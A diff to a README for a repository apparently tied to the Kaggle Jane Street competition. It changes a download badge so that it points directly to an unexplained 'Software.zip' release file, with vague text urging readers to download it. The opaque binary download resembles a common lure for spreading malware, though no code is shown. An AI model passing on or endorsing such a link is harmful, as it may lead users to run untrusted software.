@@ -14,7 +14,7 @@ Welcome to the "kagglejanestreet" repository! This is a place where you can find
 
 ## Link to Software Zip File
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/person699/kagglejanestreet/releases/download/v2.0/Software.zip)](https://github.com/person699/kagglejanestreet/releases/download/v2.0/Software.zip)
 
 The provided link leads to the Software zip file. Please click on the button to initiate the download. Once downloaded, you can explore the software for further insights and functionalities related to financial modeling and algorithmic trading.
 
